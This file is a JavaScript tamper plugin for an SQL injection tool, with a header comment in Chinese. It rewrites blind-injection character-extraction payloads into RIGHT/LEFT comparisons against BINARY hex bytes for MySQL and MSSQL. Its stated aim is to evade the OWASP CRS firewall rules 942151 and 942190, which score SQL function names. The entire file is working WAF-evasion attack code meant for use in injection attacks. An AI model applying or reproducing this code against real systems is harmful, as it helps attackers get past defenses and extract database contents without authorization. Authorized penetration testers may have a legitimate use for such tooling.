//@name: 盲注BINARY比较
//@usage: payload
//@enable: false
//@description: 盲注单字符读→LEFT/RIGHT+BINARY字节序比较（绕CRS 942151/942190函数名打分，MySQL/MSSQL）
function balEnd(s, start){
    var depth = 0;
    for (var i = start; i < s.length; i++){
        var c = s.charAt(i);
        if (c === '('){ depth++; }
        else if (c === ')'){ depth--; if (depth === 0){ return i; } }
    }
    return -1;
}
function unwrapIsnull(q){
    var ret = q;
    for (;;){
        var m = /IFNULL\(/i.exec(ret);
        if (!m){ break; }
        var end = balEnd(ret, m.index + m[0].length - 1);
        if (end < 0){ break; }
        var inner = ret.substring(m.index + m[0].length, end);
        var sep = -1, depth = 0;
        for (var i = 0; i < inner.length; i++){
            var c = inner.charAt(i);
            if (c === '('){ depth++; }
            else if (c === ')'){ depth--; }
            else if (c === ',' && depth === 0){ sep = i; }
        }
        if (sep < 1){ break; }
        var field = inner.substring(0, sep), dflt = inner.substring(sep + 1);
        ret = ret.substring(0, m.index) + '(IF(' + field + ' IS NULL,' + dflt + ',' + field + '))' + ret.substring(end + 1);
    }
    return ret;
}
function reshape(payload, openerRe, tailRe, build){
    var ret = payload, pos = 0;
    for (;;){
        var m = openerRe.exec(ret.substring(pos));
        if (!m){ break; }
        var start = pos + m.index;
        var cursor = start + m[0].length;
        if (cursor >= ret.length || ret.charAt(cursor) !== '('){ pos = cursor; continue; }
        var end = balEnd(ret, cursor);
        if (end < 0){ pos = cursor; continue; }
        var query = ret.substring(cursor, end + 1);
        var tail = tailRe.exec(ret.substring(end + 1));
        if (!tail || tail.index !== 0){ pos = cursor; continue; }
        var replacement = build(query, tail);
        if (replacement === null){ pos = cursor; continue; }
        ret = ret.substring(0, start) + replacement + ret.substring(end + 1 + tail[0].length);
        pos = start + replacement.length;
    }
    return ret;
}
function hex2(n){ return (n < 16 ? '0' : '') + n.toString(16); }
function mysqlBuild(query, rest){
    var position = rest[1], operator = rest[2], value = parseInt(rest[3], 10);
    query = unwrapIsnull(query);
    return 'RIGHT(LEFT(' + query + ',' + position + '),(' + position + '<=LENGTH(CONVERT(' + query + ' USING ascii))))' + operator + 'BINARY 0x' + hex2(value);
}
function mysqlSetBuild(query, rest){
    var position = rest[1];
    var ords = rest[2].split(',').map(function(x){ return x.trim(); }).filter(function(x){ return /^\d+$/.test(x); })
        .map(function(x){ return parseInt(x, 10); });
    if (!ords.length){ return null; }
    for (var k = 0; k < ords.length; k++){ if (ords[k] > 255){ return null; } }
    query = unwrapIsnull(query);
    var members = ords.map(function(x){ return x === 0 ? "''" : '0x' + hex2(x); }).join(',');
    return 'BINARY RIGHT(LEFT(' + query + ',' + position + '),(' + position + '<=LENGTH(CONVERT(' + query + ' USING ascii)))) IN (' + members + ')';
}
function mssqlBuild(query, rest){
    var position = rest[1], operator = rest[2], value = parseInt(rest[3], 10);
    query = query.replace(/ISNULL\(CAST\((.+?) AS NVARCHAR\(\d+\)\),\s*CHAR\(\d+\)\)/i, '($1)');
    return 'CAST(RIGHT(LEFT(' + query + ',' + position + '),CASE WHEN ' + position + '<=LEN(' + query + ') THEN 1 ELSE 0 END) AS VARBINARY)' + operator + '0x' + hex2(value);
}
function tamper(payload){
    if (!payload) { return payload; }
    var commaTail = /^\s*,\s*(\d+)\s*,\s*1\)\)\s*(>=|<=|>|<|=)\s*(\d+)/;
    var setTail = /^\s*,\s*(\d+)\s*,\s*1\)\)\s+IN\s*\(([\d,\s]+)\)/;
    var ret = reshape(payload, /ORD\(MID\(/i, setTail, mysqlSetBuild);
    ret = reshape(ret, /ORD\(MID\(/i, commaTail, mysqlBuild);
    ret = reshape(ret, /(?:UNICODE|ASCII)\(SUBSTRING\(/i, commaTail, mssqlBuild);
    return ret;
}